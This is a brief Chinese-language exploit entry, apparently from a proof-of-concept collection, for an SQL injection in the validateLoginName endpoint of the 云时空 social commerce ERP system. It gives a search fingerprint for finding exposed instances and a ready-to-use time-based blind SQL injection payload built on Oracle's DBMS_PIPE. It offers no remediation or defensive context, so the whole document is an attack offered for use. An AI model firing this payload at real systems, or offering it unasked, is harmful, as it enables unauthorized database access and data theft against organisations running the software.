# 云时空社会化商业ERP系统validateLoginName存在SQL注入漏洞

云时空社会化商业ERP系统 ｜ SQL注入 ｜ —
- **指纹**：`app="云时空社会化商业ERP系统"`

**Payload**
```
/sys/user/validateLoginName?loginName=admin'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--
```